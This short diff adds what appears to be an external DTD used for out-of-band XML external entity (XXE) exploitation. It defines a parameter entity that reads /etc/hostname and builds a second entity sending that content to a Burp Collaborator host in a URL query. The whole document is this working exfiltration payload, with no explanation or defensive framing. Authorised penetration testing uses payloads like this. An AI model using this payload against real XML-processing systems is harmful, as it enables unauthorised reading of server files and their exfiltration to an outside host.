@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://g1iozmhe6djyz00byp9ph9pmwd23qs.oastify.com.burpcollaborator.net/?leak=%file;'>">
+%all;
+
